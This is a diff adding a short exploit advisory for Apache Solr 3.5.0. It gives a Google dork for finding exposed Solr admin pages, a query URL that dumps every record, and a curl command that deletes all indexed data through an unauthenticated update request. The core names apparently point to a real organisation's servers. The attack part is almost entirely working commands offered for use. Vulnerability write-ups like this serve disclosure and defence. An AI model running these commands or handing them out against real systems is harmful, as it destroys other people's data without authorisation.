@@ -1,0 +1,29 @@
+# Exploit Title: All Solr Data Can Be Delete
+# Google Dork: intext:[Schema] [Config] [Analysis] [Schema Browser]
+[Statistics] [Info] [Distribution] [Ping] [Logging]
+# Date: 5/2/2016
+# Exploit Author: N37 [Myanmar]
+# Vendor Homepage: http://lucene.apache.org/solr/
+# Software Link:  https://archive.apache.org/dist/lucene/solr/3.5.0/
+# Version: 3.5.0
+# Tested on: fedora 23
+
+
+Solr is  open source enterprise search platform built on Apache Lucene.
+
+It can be delete all data in solr. solr are use nlp, money of data research, data mining,  some of mobile backend on vps .
+
+
+POC or Eg.
+
+This Query is shwo all data in solr :
+http://server:8080/solr/lambeth_planning/select/?q=*%3A*&version=2.2&start=0&rows=10&indent=on
+
+You can delete all data with curl in terminal :
+curl -X GET "server:8080/solr/lambeth_locations/update?stream.body=<delete><query>*:*<%2Fquery><%2Fdelete>&commit=true"
+
+now you can check with first query in browser. All data are deleted.
+
+
+Regards,
+N37 [Myanmar]
